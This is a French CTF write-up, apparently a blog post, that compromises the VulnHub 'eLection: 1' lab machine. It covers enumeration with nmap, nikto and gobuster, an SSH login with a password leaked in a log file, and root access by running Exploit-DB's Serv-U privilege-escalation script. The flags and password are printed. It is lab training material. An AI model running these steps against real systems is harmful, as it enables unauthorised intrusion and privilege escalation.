{"hash":"b89929ffb278454bd1f8bb0277abaa50df9b43f7","data":{"post":{"title":"CTF eLection: 1","date":"4 May 2021","content":"<h2>Avant propos</h2>\n<p>Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.<br>\nCe CTF a été réalisé avec une machine attaquante <strong>Kali 2021.1</strong> (<code class=\"language-text\">lsb_release -r</code>).</p>\n<h2>Enumération</h2>\n<p>On récupère l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class=\"language-text\">sudo netdiscover</code>.<br>\nAvant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite <code class=\"language-text\">export IP=192.168.1.20</code>.<br>\nPuis on créé un dossier dédié à ce CTF <code class=\"language-text\">cd Documents/ctf &amp;&amp; mkdir Election1 &amp;&amp; cd Election1</code>.<br>\nOn lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nmap -A -p- <span class=\"token variable\">$IP</span> -oN nmap.txt\nNmap scan report <span class=\"token keyword\">for</span> election.home <span class=\"token punctuation\">(</span><span class=\"token number\">192.168</span>.1.20<span class=\"token punctuation\">)</span>\nHost is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.0036s latency<span class=\"token punctuation\">)</span>.\nNot shown: <span class=\"token number\">65533</span> closed ports\nPORT   STATE SERVICE VERSION\n<span class=\"token number\">22</span>/tcp <span class=\"token function\">open</span>  <span class=\"token function\">ssh</span>     OpenSSH <span class=\"token number\">7</span>.6p1 Ubuntu 4ubuntu0.3 <span class=\"token punctuation\">(</span>Ubuntu Linux<span class=\"token punctuation\">;</span> protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span> ssh-hostkey:\n<span class=\"token operator\">|</span>   <span class=\"token number\">2048</span> <span class=\"token number\">20</span>:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 <span class=\"token punctuation\">(</span>RSA<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>   <span class=\"token number\">256</span> <span class=\"token number\">78</span>:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 <span class=\"token punctuation\">(</span>ECDSA<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_  <span class=\"token number\">256</span> b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 <span class=\"token punctuation\">(</span>ED25519<span class=\"token punctuation\">)</span>\n<span class=\"token number\">80</span>/tcp <span class=\"token function\">open</span>  http    Apache httpd <span class=\"token number\">2.4</span>.29 <span class=\"token variable\"><span class=\"token punctuation\">((</span>Ubuntu<span class=\"token punctuation\">))</span></span>\n<span class=\"token operator\">|</span>_http-server-header: Apache/2.4.29 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_http-title: Apache2 Ubuntu Default Page: It works</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On a un un serveur <strong>SSH</strong> sur le port <strong>22</strong> et un serveur <strong>Apache</strong> 2.4.29 sur le port <strong>80</strong>.</p>\n<p>Astuce vous pouvez ajouter le domaine <em>election1.home</em> dans le fichier <code class=\"language-text\">/etc/hosts</code> avec <strong>Vim</strong> (ou un autre éditeur de texte).</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> <span class=\"token function\">vim</span> /etc/hosts\n<span class=\"token number\">192.168</span>.1.20    election1.home</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Testons la sécurité du serveur <strong>Apache</strong> avec <strong>Nikto</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nikto -h http://<span class=\"token variable\">$IP</span> -o nikto.txt\n+ Server: Apache/2.4.29 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class=\"token keyword\">in</span> a different fashion to the MIME <span class=\"token builtin class-name\">type</span>\n+ No CGI Directories found <span class=\"token punctuation\">(</span>use <span class=\"token string\">'-C all'</span> to force check all possible <span class=\"token function\">dirs</span><span class=\"token punctuation\">)</span>\n+ Server may leak inodes via ETags, header found with <span class=\"token function\">file</span> /, inode: 2aa6, size: 59558e1434548, mtime: <span class=\"token function\">gzip</span>\n+ Apache/2.4.29 appears to be outdated <span class=\"token punctuation\">(</span>current is at least Apache/2.4.37<span class=\"token punctuation\">)</span>. Apache <span class=\"token number\">2.2</span>.34 is the EOL <span class=\"token keyword\">for</span> the <span class=\"token number\">2</span>.x branch.\n+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS\n+ /phpinfo.php: Output from the phpinfo<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">function</span> was found.\n+ Uncommon header <span class=\"token string\">'x-ob_mode'</span> found, with contents: <span class=\"token number\">1</span>\n+ OSVDB-3233: /phpinfo.php: PHP is installed, and a <span class=\"token builtin class-name\">test</span> script <span class=\"token function\">which</span> runs phpinfo<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> was found. This gives a lot of system information.\n+ OSVDB-3233: /icons/README: Apache default <span class=\"token function\">file</span> found.\n+ /phpmyadmin/: phpMyAdmin directory found</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Dans le fichier <a href=\"http://election1.home/robots.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">/robots.txt</a>, on a une liste de 4 répertoires potentiels.</p>\n<div class=\"gridsome-highlight\" data-language=\"txt\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-txt line-numbers\"><code class=\"language-txt\">admin\nwordpress\nuser\nelection</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Seul le dernier lien \"election\" fonctionne. On scanne le contenu du site avec <strong>Gobuster</strong></p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ gobuster <span class=\"token function\">dir</span> -u http://<span class=\"token variable\">$IP</span>/election -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.xml,.js,.md,.log,.zip\n/index.php            <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">7003</span><span class=\"token punctuation\">]</span>\n/media                <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">321</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.20/election/media/<span class=\"token punctuation\">]</span>\n/themes               <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">322</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.20/election/themes/<span class=\"token punctuation\">]</span>\n/data                 <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">320</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.20/election/data/<span class=\"token punctuation\">]</span>\n/admin                <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">321</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.20/election/admin/<span class=\"token punctuation\">]</span>\n/lib                  <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">319</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.20/election/lib/<span class=\"token punctuation\">]</span>\n/languages            <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">325</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.20/election/languages/<span class=\"token punctuation\">]</span>\n/js                   <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">318</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.20/election/js/<span class=\"token punctuation\">]</span>\n/card.php             <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">1935</span><span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Scannons le dossier \"election/admin\" avec <strong>Gobuster</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ gobuster <span class=\"token function\">dir</span> -u http://<span class=\"token variable\">$IP</span>/election/admin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.xml,.js,.md,.log,.zip\n/index.php            <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">8964</span><span class=\"token punctuation\">]</span>\n/img                  <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">325</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.20/election/admin/img/<span class=\"token punctuation\">]</span>\n/plugins              <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">329</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.20/election/admin/plugins/<span class=\"token punctuation\">]</span>\n/css                  <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">325</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.20/election/admin/css/<span class=\"token punctuation\">]</span>\n/ajax                 <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">326</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.20/election/admin/ajax/<span class=\"token punctuation\">]</span>\n/live.php             <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">22</span><span class=\"token punctuation\">]</span>\n/js                   <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">324</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.20/election/admin/js/<span class=\"token punctuation\">]</span>\n/components           <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">332</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.20/election/admin/components/<span class=\"token punctuation\">]</span>\n/logout.php           <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">83</span><span class=\"token punctuation\">]</span>\n/inc                  <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">325</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.20/election/admin/inc/<span class=\"token punctuation\">]</span>\n/logs                 <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">326</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.20/election/admin/logs/<span class=\"token punctuation\">]</span>\n/logs.php             <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">22</span><span class=\"token punctuation\">]</span>\n/dashboard.php        <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">22</span><span class=\"token punctuation\">]</span>\n/guru.php             <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">22</span><span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Le répertoire <a href=\"http://election1.home/election/admin/logs\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">/election/admin/logs</a> est intéressant car il contient un fichier \"system.log\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> system.log\n<span class=\"token punctuation\">[</span><span class=\"token number\">2020</span>-01-01 00:00:00<span class=\"token punctuation\">]</span> Assigned Password <span class=\"token keyword\">for</span> the user love: P@<span class=\"token variable\">$$</span>w0rd@123\n<span class=\"token punctuation\">[</span><span class=\"token number\">2020</span>-04-03 00:13:53<span class=\"token punctuation\">]</span> Love added candidate <span class=\"token string\">'Love'</span><span class=\"token builtin class-name\">.</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">2020</span>-04-08 <span class=\"token number\">19</span>:26:34<span class=\"token punctuation\">]</span> Love has been logged <span class=\"token keyword\">in</span> from Unknown IP on Firefox <span class=\"token punctuation\">(</span>Linux<span class=\"token punctuation\">)</span>.\n<span class=\"token punctuation\">[</span><span class=\"token number\">2021</span>-04-30 01:19:09<span class=\"token punctuation\">]</span>  has been logged out from Unknown IP.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On un candidat potentiel \"love:P@$$w0rd@123\" pour la connexion <strong>SSH</strong>.</p>\n<h3>Pénétration</h3>\n<p>On se connecte en <strong>SSH</strong> au serveur avec l'utilisateur \"love\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">ssh</span> love@<span class=\"token variable\">$IP</span>\npassword: P@<span class=\"token variable\">$$</span>w0rd@123</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>On trouve facilement le flag user dans le dossier \"Desktop\" de l'utilisateur.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> Desktop/user.txt\ncd38ac698c0d793a5236d01003f692b0</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<h3>Escalation</h3>\n<p>En cherchant les exécutables avec des permisions spéciales pour l'utilisateur courant (<strong>SUID</strong>), on trouve un répertoire qui sort du lot.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">find</span> / -perm -4000 -type f <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null\n/usr/local/Serv-U/Serv-U</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>En effet, après une brève recherche sur Internet, <strong>Serv-U</strong> est un serveur <strong>FTP</strong> sécurisé. Dans les fichiers présents, on peut retrouver la version utilisée.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /usr/local/Serv-U/Serv-U-StartupLog.txt\n<span class=\"token punctuation\">[</span>01<span class=\"token punctuation\">]</span> Fri 30Apr21 01:02:02 - Serv-U File Server <span class=\"token punctuation\">(</span><span class=\"token number\">64</span>-bit<span class=\"token punctuation\">)</span> - Version <span class=\"token number\">15.1</span> <span class=\"token punctuation\">(</span><span class=\"token number\">15.1</span>.6.25<span class=\"token punctuation\">)</span> - <span class=\"token punctuation\">(</span>C<span class=\"token punctuation\">)</span> <span class=\"token number\">2017</span> SolarWinds Worldwide, LLC.  All rights reserved.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>On effectue une recherche d'exploit sur <strong>Searchsploit</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ searchsploit Serv-U <span class=\"token number\">15.1</span>\nServ-U FTP Server <span class=\"token operator\">&lt;</span> <span class=\"token number\">15.1</span>.7 - Local Privilege Escalation <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> linux/local/47009.c\nServ-U FTP Server <span class=\"token operator\">&lt;</span> <span class=\"token number\">15.1</span>.7 - Local Privilege Escalation <span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> multiple/local/47173.sh</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>On trouve 2 exploits semblables, le premier est écrit en langage C et le second en Shell.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ searchsploit -p <span class=\"token number\">47173</span>\n  Exploit: Serv-U FTP Server <span class=\"token operator\">&lt;</span> <span class=\"token number\">15.1</span>.7 - Local Privilege Escalation <span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n      URL: https://www.exploit-db.com/exploits/47173\n     Path: /usr/share/exploitdb/exploits/multiple/local/47173.sh\nFile Type: Bourne-Again shell script, ASCII text executable, with CRLF line terminators</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On copie le fichier <code class=\"language-text\">cp /usr/share/exploitdb/exploits/multiple/local/47173.sh .</code> que l'on converti au format unix pour pouvoir l'exécuter correctement par la suite <code class=\"language-text\">dos2unix 47173.sh</code>. Puis on transfère ce dernier sur le serveur via <strong>SCP</strong> dans le dossier \"/tmp\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">scp</span> <span class=\"token number\">47173</span>.sh love@<span class=\"token variable\">$IP</span>:/tmp\npassword: P@<span class=\"token variable\">$$</span>w0rd@123</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Sur le serveur, on se place dans le répertoire \"/tmp\" pour exécuter le script.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token builtin class-name\">cd</span> /tmp\n$ ./47173.sh\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Launching Serv-U <span class=\"token punctuation\">..</span>.\nsh: <span class=\"token number\">1</span>: <span class=\"token builtin class-name\">:</span> Permission denied\n<span class=\"token punctuation\">[</span>+<span class=\"token punctuation\">]</span> Success:\n-rwsr-xr-x <span class=\"token number\">1</span> root root <span class=\"token number\">1113504</span> Apr <span class=\"token number\">30</span> 01:44 /tmp/sh\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Launching root shell: /tmp/sh\nsh-4.4<span class=\"token comment\"># id</span>\n<span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">1000</span><span class=\"token punctuation\">(</span>love<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">1000</span><span class=\"token punctuation\">(</span>love<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">euid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">1000</span><span class=\"token punctuation\">(</span>love<span class=\"token punctuation\">)</span>,4<span class=\"token punctuation\">(</span>adm<span class=\"token punctuation\">)</span>,24<span class=\"token punctuation\">(</span>cdrom<span class=\"token punctuation\">)</span>,30<span class=\"token punctuation\">(</span>dip<span class=\"token punctuation\">)</span>,33<span class=\"token punctuation\">(</span>www-data<span class=\"token punctuation\">)</span>,46<span class=\"token punctuation\">(</span>plugdev<span class=\"token punctuation\">)</span>,116<span class=\"token punctuation\">(</span>lpadmin<span class=\"token punctuation\">)</span>,126<span class=\"token punctuation\">(</span>sambashare<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>L'exploit a fonctionné, on a les droits de l'utilisateur root.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">whoami</span>\nroot</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>On peut donc accéder au flag root.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /root/root.txt\n5238feefc4ffe09645d97e9ee49bc3a6</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n","download":"https://www.vulnhub.com/entry/election-1,503/","tags":[{"title":"Pentest","path":"/tag/Pentest/"},{"title":"CTF","path":"/tag/CTF/"}],"timeToRead":6,"parts":[]}},"context":{}}